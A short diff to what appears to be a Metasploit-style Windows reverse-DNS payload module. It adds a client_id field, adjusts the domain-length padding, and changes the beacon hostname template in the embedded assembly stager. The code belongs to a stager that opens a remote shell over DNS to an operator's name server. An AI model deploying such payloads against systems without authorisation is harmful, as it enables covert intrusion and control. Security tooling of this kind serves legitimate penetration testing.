@@ -28,8 +28,9 @@ module Payload::Windows::ReverseDns
   def generate(opts={})
     ds = opts[:datastore] || datastore
     conf = {
-      ns_server:        ds['NS_SERVER'],
-      domain:        ds['DOMAIN'],
+      ns_server:   ds['NS_SERVER'],
+      domain:      ds['DOMAIN'],
+      client_id:   '0', 
       retry_count: ds['ReverseConnectRetries'],
       reliable:    false
     }
@@ -103,7 +104,7 @@ module Payload::Windows::ReverseDns
     retry_count  = [opts[:retry_count].to_i, 1000].max
     domain       = opts[:domain]  
     ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
-    domain_length= domain.length + 16
+    domain_length= domain.length + 18
     
     alloc_stack  = (domain_length) + (4 - (domain_length %4))
     reliable     = opts[:reliable]
@@ -125,7 +126,7 @@ module Payload::Windows::ReverseDns
          jmp           start_code
       
       hostname:
-        db "aaaa.000g.0000.#{domain}", 0x00
+        db "7812.000g.0000.0.#{domain}", 0x00
         
         ;;;;;;;;;;; INCREMENT DOMAIN
       increment:
